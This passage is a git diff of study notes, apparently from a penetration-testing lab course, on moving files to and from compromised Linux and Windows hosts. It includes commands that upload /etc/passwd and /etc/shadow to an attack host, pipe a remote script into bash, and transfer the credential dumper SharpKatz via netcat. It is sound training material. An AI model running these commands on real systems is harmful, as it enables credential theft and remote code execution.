@@ -351,5 +351,300 @@ Similarly, we can download a Python script file from a web server and pipe it in
 ```shell
 wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3 Hello World!
 ```
+## Download with Bash (/dev/tcp)
 
+There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.
 
+```shell
+exec 3<>/dev/tcp/10.10.10.32/80 # we can use form 3 to ... to start a socket
+
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+
+cat <&3
+```
+## SSH Downloads
+
+SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.
+`CP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.
+
+`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.
+#### Enabling and starting the SSH Server
+
+```shell
+sudo systemctl enable ssh
+sudo systemctl start ssh
+```
+#### Checking for SSH Listening Port
+
+```shell
+netstat -lnpt
+```
+#### Linux - Downloading Files Using SCP
+
+```shell
+scp plaintext@192.168.49.128:/root/myroot.txt .
+```
+## Upload Operations
+
+There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.
+## Web Upload
+
+As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.
+
+The first thing we need to do is to install the `uploadserver` module.
+
+```shell
+sudo python3 -m pip install --user uploadserver
+```
+
+Now we need to create a certificate. In this example, we are using a self-signed certificate.
+
+```shell
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+
+>[!Important] 
+>The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
+
+```shell
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+
+Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
+
+```shell
+curl -X POST https://192.168.231.136/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
+We used the option `--insecure` because we used a self-signed certificate that we trust.
+## Alternative Web File Transfer Method
+
+Since Linux distributions usually have `Python` or `php` installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.
+
+It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.
+#### Creating a Web Server with Python3
+
+```shell
+python3 -m http.server
+```
+#### Creating a Web Server with Python2.7
+
+```shell
+python2.7 -m SimpleHTTPServer
+```
+#### Creating a Web Server with PHP
+
+```shell
+php -S 0.0.0.0:8000
+```
+#### Creating a Web Server with Ruby
+
+```shell
+ruby -run -ehttpd . -p8000
+```
+#### Download the File from the Target Machine
+
+```shell
+wget 192.168.49.128:8000/filetotransfer.txt
+```
+## SCP Upload
+
+We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.
+
+```shell
+scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+```
+
+### Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, extract the file, and run "hasher file" from the command line.
+
+```shell
+scp upload_nix.zip htb-student@10.129.234.168:/home/htb-student/upload_nix.zip
+```
+
+I SSHed the box and extracted the file
+
+```shell
+gunzip -S .zip upload_nix.zip
+# AND GET THE HASH
+hasher upload_nix.zip
+```
+
+# Transferring Files with Code
+
+It's common to find different programming languages installed on the machines we are targeting. Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions but can also be installed on Windows, although this is far less common.
+
+We can use some Windows default applications, such as `cscript` and `mshta`, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.
+## Python
+
+Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. `Python` can run one-liners from an operating system command line using the option `-c`. Let's see some examples:
+
+-  Python 2 - Download
+
+```python
+python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+
+- Python 3 - Download
+
+```python
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+## PHP
+
+`PHP` is also very prevalent and provides multiple file transfer methods. [According to W3Techs' data](https://w3techs.com/technologies/details/pl-php), PHP is used by 77.4% of all websites with a known server-side programming language.
+
+In the following example, we will use the PHP [file_get_contents() module](https://www.php.net/manual/en/function.file-get-contents.php) to download content from a website combined with the [file_put_contents() module](https://www.php.net/manual/en/function.file-put-contents.php) to save the file into a directory. `PHP` can be used to run one-liners from an operating system command line using the option `-r`.
+#### PHP Download with File_get_contents()
+
+```php
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+```
+
+An alternative to `file_get_contents()` and `file_put_contents()` is the [fopen() module](https://www.php.net/manual/en/function.fopen.php). We can use this module to open a URL, read it's content and save it into a file.
+#### PHP Download with Fopen()
+
+```php
+php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+```
+We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.
+#### PHP Download a File and Pipe it to Bash
+
+```php
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+
+>[!note]
+>The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.
+## Other Languages
+
+`Ruby` and `Perl` are other popular languages that can also be used to transfer files. These two programming languages also support running one-liners from an operating system command line using the option `-e`.
+#### Ruby - Download a File
+
+```ruby
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+```
+#### Perl - Download a File
+
+```perl
+perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+```
+## JavaScript
+
+JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.
+
+The following JavaScript code is based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:
+
+```js
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); 
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send(); 
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1; BinStream.Open(); 
+BinStream.Write(WinHttpReq.ResponseBody); 
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.
+
+```powershell
+cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+```
+## VBScript
+
+[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.
+We'll create a file called `wget.vbs` and save the following content:
+
+```vbscript
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") dim bStrm: Set bStrm = createobject("Adodb.Stream") xHttp.Open "GET", WScript.Arguments.Item(0), False xHttp.Send with bStrm .type = 1 .open .write xHttp.responseBody .savetofile WScript.Arguments.Item(1), 2 end with
+```
+
+We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.
+#### Download a File Using VBScript and cscript.exe
+
+```powershell
+cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+```
+## Upload Operations using Python3
+
+If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 [requests module](https://pypi.org/project/requests/) allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 [uploadserver](https://github.com/Densaugeo/uploadserver).
+#### Starting the Python uploadserver Module
+
+```python
+python3 -m uploadserver
+```
+#### Uploading a File Using a Python One-liner
+
+```python
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+Let's divide this one-liner into multiple lines to understand each piece better.
+
+```python
+# To use the requests function, we need to import the module first. 
+import requests 
+
+# Define the target URL where we will upload the file. 
+URL = "http://192.168.49.128:8000/upload" 
+
+# Define the file we want to read, open it and save it in a variable. 
+file = open("/etc/passwd","rb") 
+
+# Use a requests POST request to upload the file. 
+r = requests.post(url,files={"files":file})
+```
+
+We can do the same with any other programming language. A good practice is picking one and trying to build an upload program.
+
+# Miscellaneous File Transfer Methods
+
+We've covered various methods for transferring files on Windows and Linux. We also covered ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.
+## Netcat
+
+[Netcat](https://sectools.org/tool/netcat/) (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.
+## File Transfer with Netcat and Ncat
+
+The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.
+
+In this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.
+
+We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`.
+#### NetCat - Compromised Machine - Listening on Port 8000
+```shell
+# Example using Original Netcat
+nc -l -p 8000 > SharpKatz.exe
+# Example using Ncat
+ncat -l -p 8000 --recv-only > SharpKatz.exe
+```
+#### Netcat - Attack Host - Sending File to Compromised machine
+
+```shell
+wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+# Netcat
+nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+
+# NCAT
+ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+```
+
+By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.
+#### Attack Host - Sending File as Input to Netcat
+
+```shell
+# Attack host
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+# Compromised Machine
+nc 192.168.49.128 443 > SharpKatz.exe
+```
+
+>[!Important]
+>Con `< SharpKatz.exe`, en vez de que netcat espere tu teclado, **lee el contenido binario del archivo SharpKatz.exe como si fuera lo que ibas a teclear**, y automáticamente **envía todo ese contenido** al cliente en cuanto se conecta.
+
+If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).
+#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
+
+```shell
+cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
+## PowerShell Session File Transfer
+
+We already talked about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.
